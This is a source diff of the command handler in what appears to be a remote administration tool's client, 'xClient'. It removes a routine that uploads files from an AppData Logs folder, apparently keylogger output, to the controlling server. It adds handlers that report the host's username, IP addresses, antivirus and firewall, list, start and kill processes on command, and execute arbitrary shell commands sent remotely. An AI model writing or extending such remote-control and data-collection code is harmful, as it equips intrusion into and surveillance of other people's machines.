+++ Client/Core/Commands/SystemHandler.cs
@@ -2,11 +2,10 @@
 using System.Collections.Generic;
 using System.Diagnostics;
 using System.IO;
-using System.Threading;
 using System.Windows.Forms;
 using Microsoft.Win32;
-using xClient.Core.Helper;
 using xClient.Core.Information;
+using xClient.Core.RemoteShell;
 
 namespace xClient.Core.Commands
 {
@@ -16,58 +15,6 @@ namespace xClient.Core.Commands
         public static void HandleDrives(Packets.ServerPackets.Drives command, Client client)
         {
             new Packets.ClientPackets.DrivesResponse(Environment.GetLogicalDrives()).Execute(client);
-        }
-
-        public static void HandleGetLogs(Packets.ServerPackets.GetLogs command, Client client)
-        {
-            new Thread(() =>
-            {
-                try
-                {
-                    int index = 1;
-                    string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Logs\\";
-
-                    if (!Directory.Exists(path))
-                    {
-                        new Packets.ClientPackets.GetLogsResponse("", new byte[0], -1, -1, "", index, 0).Execute(client);
-                        return;
-                    }
-
-                    FileInfo[] iFiles = new DirectoryInfo(path).GetFiles();
-
-                    if (iFiles.Length == 0)
-                    {
-                        new Packets.ClientPackets.GetLogsResponse("", new byte[0], -1, -1, "", index, 0).Execute(client);
-                        return;
-                    }
-
-                    foreach (FileInfo file in iFiles)
-                    {
-                        FileSplit srcFile = new FileSplit(file.FullName);
-
-                        if (srcFile.MaxBlocks < 0)
-                            new Packets.ClientPackets.GetLogsResponse("", new byte[0], -1, -1, srcFile.LastError, index, iFiles.Length).Execute(client);
-
-                        for (int currentBlock = 0; currentBlock < srcFile.MaxBlocks; currentBlock++)
-                        {
-                            byte[] block;
-                            if (srcFile.ReadBlock(currentBlock, out block))
-                            {
-                                new Packets.ClientPackets.GetLogsResponse(Path.GetFileName(file.Name), block, srcFile.MaxBlocks, currentBlock, srcFile.LastError, index, iFiles.Length).Execute(client);
-                                //Thread.Sleep(200);
-                            }
-                            else
-                                new Packets.ClientPackets.GetLogsResponse("", new byte[0], -1, -1, srcFile.LastError, index, iFiles.Length).Execute(client);
-                        }
-
-                        index++;
-                    }
-                }
-                catch (Exception ex)
-                {
-                    new Packets.ClientPackets.GetLogsResponse("", new byte[0], -1, -1, ex.Message, -1, -1).Execute(client);
-                }
-            }).Start();
         }
 
         public static void HandleAction(Packets.ServerPackets.Action command, Client client)
@@ -297,6 +244,123 @@ namespace xClient.Core.Commands
             {
                 new Packets.ClientPackets.Status("Adding Autostart Item failed!").Execute(client);
             }
+        }
+
+        public static void HandleGetSystemInfo(Packets.ServerPackets.GetSystemInfo command, Client client)
+        {
+            try
+            {
+                string[] infoCollection = new string[]
+                {
+                    "Processor (CPU)",
+                    SystemCore.GetCpu(),
+                    "Memory (RAM)",
+                    string.Format("{0} MB", SystemCore.GetRam()),
+                    "Video Card (GPU)",
+                    SystemCore.GetGpu(),
+                    "Username",
+                    SystemCore.GetUsername(),
+                    "PC Name",
+                    SystemCore.GetPcName(),
+                    "Uptime",
+                    SystemCore.GetUptime(),
+                    "MAC Address",
+                    SystemCore.GetMacAddress(),
+                    "LAN IP Address",
+                    SystemCore.GetLanIp(),
+                    "WAN IP Address",
+                    SystemCore.WanIp,
+                    "Antivirus",
+                    SystemCore.GetAntivirus(),
+                    "Firewall",
+                    SystemCore.GetFirewall()
+                };
+
+                new Packets.ClientPackets.GetSystemInfoResponse(infoCollection).Execute(client);
+            }
+            catch
+            {
+            }
+        }
+
+        public static void HandleGetProcesses(Packets.ServerPackets.GetProcesses command, Client client)
+        {
+            Process[] pList = Process.GetProcesses();
+            string[] processes = new string[pList.Length];
+            int[] ids = new int[pList.Length];
+            string[] titles = new string[pList.Length];
+
+            int i = 0;
+            foreach (Process p in pList)
+            {
+                processes[i] = p.ProcessName + ".exe";
+                ids[i] = p.Id;
+                titles[i] = p.MainWindowTitle;
+                i++;
+            }
+
+            new Packets.ClientPackets.GetProcessesResponse(processes, ids, titles).Execute(client);
+        }
+
+        public static void HandleStartProcess(Packets.ServerPackets.StartProcess command, Client client)
+        {
+            if (string.IsNullOrEmpty(command.Processname))
+            {
+                new Packets.ClientPackets.Status("Process could not be started!").Execute(client);
+                return;
+            }
+
+            try
+            {
+                ProcessStartInfo startInfo = new ProcessStartInfo
+                {
+                    UseShellExecute = true,
+                    FileName = command.Processname
+                };
+                Process.Start(startInfo);
+            }
+            catch
+            {
+                new Packets.ClientPackets.Status("Process could not be started!").Execute(client);
+            }
+            finally
+            {
+                HandleGetProcesses(new Packets.ServerPackets.GetProcesses(), client);
+            }
+        }
+
+        public static void HandleKillProcess(Packets.ServerPackets.KillProcess command, Client client)
+        {
+            try
+            {
+                Process.GetProcessById(command.PID).Kill();
+            }
+            catch
+            {
+            }
+            finally
+            {
+                HandleGetProcesses(new Packets.ServerPackets.GetProcesses(), client);
+            }
+        }
+
+        public static void HandleShellCommand(Packets.ServerPackets.ShellCommand command, Client client)
+        {
+            string input = command.Command;
+
+            if (_shell == null && input == "exit") return;
+            if (_shell == null) _shell = new Shell();
+
+            if (input == "exit")
+                CloseShell();
+            else
+                _shell.ExecuteCommand(input);
+        }
+
+        public static void CloseShell()
+        {
+            if (_shell != null)
+                _shell.Dispose();
         }
     }
 }
